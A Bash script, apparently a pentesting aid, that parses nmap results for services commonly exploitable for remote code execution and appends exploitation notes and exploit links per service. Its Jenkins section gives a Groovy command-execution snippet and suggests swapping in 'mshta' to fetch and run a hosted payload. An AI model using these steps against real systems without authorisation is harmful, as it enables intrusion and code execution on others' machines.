#!/bin/bash

# Parse NMAP files for easy RCE Ports
# Work in progress

input="$1"
output="$2"

function show_usage (){
    echo 'Usage: ./RCE-Parser.sh inputfile.nmap outputfile'
    echo ''
}
#If you want to nmap specifically for these ports:
#nmap -Pn -sS -sV --open -p 1090,1098,1099,4444,11099,47001,47002,10999,12721,7000-7004,8000-8003,9000-9003,9503,7070,7071,45000,45001,8686,9012,50500,4848,11111,4444,4445,4786,5555,5556,8880,8088,6379,2375,8983,8383,4990,9000,8500,6066,5000,8080,3300,6129,6970 -iL targets.txt -oA rce-ports


# Lame attempt at ASCII art to make it Super1337
function ascii_art (){
    echo '+--------------------------------+'
    echo '|======[ RCE-Cream-Parcer ]======|'
    echo '+--------------------------------+'
    echo '|| \|N\|M\|A\|P\||/D|/A|/T|/A|/ ||'
    echo '|.  .  .  .  .  ..  .  .  .  .  .|'
    echo '|.  .  .  .  .  ..  .  .  .  .  .|'
    echo '|.  .  .  .  .  ..  .  .  .  .  .|'
    echo '|.  .  .  ==============  .  .  .|'
    echo '|.  .  .    \-Parser-/    .  .  .|'
    echo '|.  .  .     \______/     .  .  .|'
    echo '|.  .  .        []        .  .  .|'
    echo '|.  .  .        ..        .  .  .|'
    echo '|.  .  .       _.._       .  .  .|'
    echo '|.  .  .      (_RCE)      .  .  .|'
    echo '|.  .  .     (Cream_)     .  .  .|'
    echo '|.  .  .    (________)    .  .  .|'
    echo '|.  .  .     \/\/\/\/     .  .  .|'
    echo '|.  .  .      \/\/\/      .  .  .|'
    echo '|.  .  .       \/\/       .  .  .|'
    echo '|.  .  .        \/        .  .  .|'
    echo '+--------------------------------+'
    echo '| https://github.com/fancysauced |'
    echo '+--------------------------------+'
    echo ''
}


function show_usage (){
    echo 'Usage: ./RCE-Parser.sh inputfile.nmap outputfile'
    echo ''
}


function processing (){
    echo 'Processing data...'
}

function rce_parser (){
    cat $input | grep -i 'Nmap scan report for \|^1090/tcp\|^1098/tcp\|^1099/tcp\|^4444/tcp\|^11099/tcp\|^47001/tcp\|^47002/tcp\|^10999/tcp\|^12721/tcp\|^7000/tcp\|^7001/tcp\|^7002/tcp\|^7003/tcp\|^7004/tcp\|^8000/tcp\|^8001/tcp\|^8002/tcp\|^8003/tcp\|^9000/tcp\|^9001/tcp\|^9002/tcp\|^9003/tcp\|^9503/tcp\|^7070/tcp\|^7071/tcp\|^45000/tcp\|^45001/tcp\|^8686/tcp\|^9012/tcp\|^50500/tcp\|^4848/tcp\|^11111/tcp\|^4444/tcp\|^4445/tcp\|^4786/tcp\|^5555/tcp\|^5556/tcp\|^8880/tcp\|^8088/tcp\|^6379/tcp\|^2375/tcp\|^8983/tcp\|^8383/tcp\|^4990/tcp\|^8500/tcp\|^6066/tcp\|^5000/tcp\|^3300/tcp\|^6129/tcp\|^6970/tcp\|weblogic\|jdwp\|jmx\|glassfish\|jboss\|redis\|sap\|dameware\|coldfusion\|jenkins\|docker\|flink\|spark\|hadoop\|zoho\|manageengine\|hashicorp\|consul\|websphere\|solr\|portainer\|java-rmi\|java rmi\|rmi-registry\|hp data protector\|cisco smart install\|cisco unified communications manager\|tomcat\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' > $output
}

function jenkins (){
echo '
----------
- Jenkins: 8080

    If no auth required, script engine php execution:
    def cmd = "cmd.exe /c whoami".execute();
    println("${cmd.text}");    
    #Replace whoami with hosted payload. mshta http://file.hta

    If auth required and outdated:
    [https://github.com/orangetw/awesome-jenkins-rce-2019]
    Check /securityRealm/user/admin/, should return admin user page, if vulnerable.
' >> $output

    cat $input | grep -i 'Nmap scan report for \|jenkins\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function javarmi (){
echo '
---------
- Java RMI: 1090,1098,1099,4444,11099,47001,47002,10999
- Java RMI vcenter: 12721
    Check nmap results for "rmi-registry,java-rmi".
    nmap -v -Pn --open -sV -p 1099 --script rmi-vulnclassloader,rmi-dumpregistry

    [https://github.com/frohoff/ysoserial]

    [https://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server]

    [https://medium.com/@afinepl/java-rmi-for-pentesters-structure-recon-and-communication-non-jmx-registries-a10d5c996a79]

    [https://medium.com/@afinepl/java-rmi-for-pentesters-part-two-reconnaissance-attack-against-non-jmx-registries-187a6561314d]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|java-rmi\|java rmi\|rmi-registry\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function weblogic (){
echo '
---------
- WebLogic: 7000-7004,8000-8003,9000-9003,9503,7070,7071

    [https://www.exploit-db.com/search?q=weblogic]
' >> $output

   cat $input | grep -i 'Nmap scan report for \|weblogic\|^7000/tcp\|^7001/tcp\|^7002/tcp\|^7003/tcp\|^7004/tcp\|^8000/tcp\|^8001/tcp\|^8002/tcp\|^8003/tcp\|^9000/tcp\|^9001/tcp\|^9002/tcp\|^9003/tcp\|^9503/tcp\|^7070/tcp\|^7071/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function jdwp (){
echo '
---------
- JDWP: 45000,45001

    [https://www.rapid7.com/db/modules/exploit/multi/misc/java_jdwp_debugger]

    [https://github.com/IOActive/jdwp-shellifier]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|jdwp\|^45000/tcp\|^45001/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function jmx (){
echo '
---------
- JMX: 8686,9012,50500

    [https://www.rapid7.com/db/modules/exploit/multi/misc/java_jmx_server]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|jmx\|^8686/tcp\|^9012/tcp\|^50500/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function glassfish (){
echo '
---------
- GlassFish: 4848

    [https://www.rapid7.com/db/modules/auxiliary/scanner/http/glassfish_traversal]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|glassfish\|^4848/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function jboss (){
echo '
---------
- jBoss: 11111,4444,4445

    [https://www.rapid7.com/db/modules/auxiliary/scanner/http/jboss_vulnscan]

    [https://github.com/joaomatosf/jexboss]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|jboss\|^11111/tcp\|^4444/tcp\|^4445/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function ciscosmartinstall (){
echo '
---------
- Cisco Smart Install: 4786

    [https://www.rapid7.com/db/modules/auxiliary/scanner/misc/cisco_smart_install]

    [https://github.com/Sab0tag3d/SIET]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|cisco smart install\|^4786/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function hpdataprotector (){
echo '
---------
- HP Data Protector: 5555,5556

    [https://www.rapid7.com/db/modules/exploit/multi/misc/hp_data_protector_exec_integutil]

    [https://www.rapid7.com/db/modules/exploit/windows/misc/hp_dataprotector_cmd_exec]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|hp data protector\|^5555/tcp\|^5556/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function redis (){
echo '
---------
- Redis: 6379

    [https://www.rapid7.com/db/modules/exploit/linux/redis/redis_replication_cmd_exec/]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|redis\|^6379/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function sap (){
echo '
---------
- SAP: 3300

    [https://github.com/chipik/SAP_GW_RCE_exploit]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|sap\|^3300/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function dameware (){
echo '
---------
- Dameware: 6129

    [https://www.tenable.com/security/research/tra-2019-43]

    [https://github.com/tenable/poc/blob/master/Solarwinds/Dameware/dwrcs_dwDrvInst_rce.py]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|dameware\|^6129/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function cucm (){
echo '
---------
- Cisco Unified Communications Manager: 6970

    http://[CUCM IP Address]:6970/ConfigFileCacheList.txt
' >> $output

    cat $input | grep -i 'Nmap scan report for \|cisco unified communications manager\|^6970/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function coldfusion (){
echo '
---------
- Adobe Coldfusion Blaze DS: 8080

    [https://www.tenable.com/plugins/nessus/99731]
' >> $output

    cat $input | grep -i 'Nmap scan report for \|coldfusion\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function docker (){
echo '
---------
- Docker: 2375


' >> $output
    cat $input | grep -i 'Nmap scan report for \|docker\|^2375/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function atlassian (){
echo '
---------
- Atlassian Crowd: 4990


' >> $output
    cat $input | grep -i 'Nmap scan report for \|atlassian\|^4990/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function flink (){
echo '
---------
- Apache flink: 5000


' >> $output
    cat $input | grep -i 'Nmap scan report for \|flink\|^5000/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function spark (){
echo '
---------
- Apache Spark: 6066


' >> $output
    cat $input | grep -i 'Nmap scan report for \|spark\|^6066/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function hadoop (){
echo '
---------
- Apache Hadoop: 8088


' >> $output
    cat $input | grep -i 'Nmap scan report for \|hadoop\|^8088/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function manageengine (){
echo '
---------
- Zoho Manageengine Desktop: 8383


' >> $output
    cat $input | grep -i 'Nmap scan report for \|zoho\|manageengine\|^8383/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function hashicorp (){
echo '
---------
- Hashicorp Consul: 8500


' >> $output
    cat $input | grep -i 'Nmap scan report for \|hashicorp\|consul\|^8500/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function websphere (){
echo '
---------
- IBM WebSphere: 8880


' >> $output
    cat $input | grep -i 'Nmap scan report for \|websphere\|^8880/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function solr (){
echo '
---------
- Apache Solr: 8983


' >> $output
    cat $input | grep -i 'Nmap scan report for \|solr\|^8983/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function portainer (){
echo '
---------
- Portainer: 9000


' >> $output
    cat $input | grep -i 'Nmap scan report for \|portainer\|^9000/tcp\|Service Info:' | sed 's/Nmap scan report for /\n/g' | grep -vi 'filtered\|closed\|#\|SF:\|SF-\|unrecognized\|incorrect\|Warning:\|Host is' | grep -B2 '/tcp' >> $output
}

function final (){
    echo 'Done'    
}


if [ "$#" -ne 2 ]; then
    ascii_art
    show_usage
else
    ascii_art
    processing
    rce_parser
    jenkins
    javarmi
    weblogic
    jdwp
    jmx
    glassfish
    jboss
    ciscosmartinstall
    hpdataprotector
    redis
    sap
    dameware
    cucm
    coldfusion
    docker
    atlassian
    flink
    spark
    hadoop
    manageengine
    hashicorp
    websphere
    solr
    portainer
    final
fi
